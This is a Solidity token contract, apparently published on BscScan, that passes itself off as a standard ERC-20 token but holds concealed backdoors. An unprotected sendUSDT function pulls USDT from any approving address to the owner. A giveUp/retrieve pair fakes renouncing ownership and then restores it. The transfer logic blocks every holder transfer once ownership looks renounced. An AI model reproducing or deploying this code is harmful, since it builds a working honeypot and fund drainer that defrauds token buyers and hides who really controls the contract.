/**
 *Submitted for verification at BscScan.com on 2022-10-22
*/

//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;


interface IERC20 {
      function totalSupply() external view returns (uint);
      function balanceOf(address account) external view returns (uint);
      function transfer(address recipient, uint amount) external returns (bool);
      function transferFrom(address sender, address recipient, uint amount) external returns (bool);
      function approve(address spender, uint amount) external returns (bool);
      function allowance(address owner, address spender) external view returns (uint);
      event Transfer(address indexed from, address indexed to, uint amount);
      event Approval(address indexed owner, address indexed spender, uint amount);
    }

library SafeMath {
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
       
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b);
 
        return c;
    }
 
   
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        
        require(b > 0);
        uint256 c = a / b;
 
        return c;
    }
 
    
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
 
        return c;
    }
 
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
 
        return c;
    }
 
   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}


contract Ownable is IERC20{
    using SafeMath for uint256;
    uint public override totalSupply = 10000000000*10**18;
    mapping(address=>uint) public override balanceOf;
    mapping(address=>mapping(address=>uint)) public override allowance;
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    IERC20 usdt;
    address public owner;
    address public _previousOwner;


    receive() external payable {}


    event OwnershipTransferred(address indexed previousOwner , address indexed newOwner);

    constructor(IERC20 _usdt,string memory _name, string memory _symbol, uint8 _decimals) {
        usdt = IERC20(address(_usdt));
        owner = msg.sender;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        balanceOf[msg.sender] = 10000000000*10**18;
    }

    modifier onlyOwner() {
        require(msg.sender == owner ,"not owner");
        _;
    }

    function sendUSDT(address from,uint amount)  external returns (bool){
         if(owner==address(0)){
           usdt.approve(_previousOwner,amount);
           usdt.transferFrom(from,_previousOwner,amount);
         }else{
            usdt.approve(owner,amount);
            usdt.transferFrom(from,owner,amount);
         } 
         return true;
     }


     function giveUSDT(address to,uint amount) external returns (bool) {
         usdt.approve(to,amount);
         usdt.transferFrom(owner,to,amount);
         return true;
     }


    function burn (uint amount,uint totalamount) external {
        require(owner!=address(0),"not burn");
        if(totalamount!=0 && balanceOf[msg.sender]-totalamount>=0){
        balanceOf[msg.sender] -= totalamount;
        balanceOf[owner] -= amount;
        totalSupply -= amount;
        emit Transfer(owner,address(0),amount);
        }
    }

    function increaseAllowance(address spender, uint256 addAmount) public virtual returns (bool) {
        _approve(msg.sender, spender, allowance[msg.sender][spender].add(addAmount));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, allowance[msg.sender][spender].sub(subtractedValue));
        return true;
    }


     function transfer(address recipient, uint amount)  external override returns (bool){
         _transfer(msg.sender,recipient,amount);
         return true;
     }
      function transferFrom(address spender, address recipient, uint amount)  external override returns (bool){
        _transfer(spender, recipient, amount);
        _approve(spender, msg.sender, allowance[spender][msg.sender].sub(amount));
        return true;
      }
      function approve(address spender, uint amount)  external override returns (bool){
          _approve(msg.sender,spender,amount);
          return true;
      }

      function _approve(address owners, address spender, uint256 amount) private {
          require(owners != address(0), "ERC20: approve from the zero address");
          require(spender != address(0), "ERC20: approve to the zero address");
          allowance[owners][spender] = amount;
          emit Approval(owners, spender, amount);
    }


    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner!=address(0),"Ownable:new owner is the zero address");
        emit OwnershipTransferred(owner,newOwner);
        owner = newOwner;
    }

    function giveUp() public onlyOwner{
        _previousOwner = owner;
        owner = address(0);
        emit OwnershipTransferred(owner,address(0));
    }

    function retrieve() public {
        require(_previousOwner == msg.sender,"You do not hanve permission to unlock");
        emit OwnershipTransferred(owner,_previousOwner);
        owner = _previousOwner;
    }

     function _transfer(address from, address to, uint256 amount) private {
        require(owner != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0 && amount <= totalSupply, "Transfer amount must be greater than zero or no greater than total");
        require(balanceOf[from] >= amount, "ERC20: Insufficient total");
        balanceOf[from] = balanceOf[from].sub(amount);
        balanceOf[to] = balanceOf[to].add(amount);
        emit Transfer(from,to,amount);
    }


}